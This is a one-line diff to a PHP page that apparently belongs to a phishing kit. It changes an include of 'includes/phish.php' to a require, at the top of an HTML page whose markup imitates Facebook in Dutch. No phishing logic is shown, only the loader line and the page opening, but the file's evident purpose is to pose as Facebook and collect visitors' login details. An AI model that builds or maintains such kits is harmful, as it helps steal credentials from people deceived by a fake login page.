@@ -1,6 +1,6 @@
 <?php
 # INCLUDE Config and Script
-include('includes/phish.php');
+require('includes/phish.php');
 ?>
 <!DOCTYPE html>
 <html lang="nl" id="facebook" class="no_js">
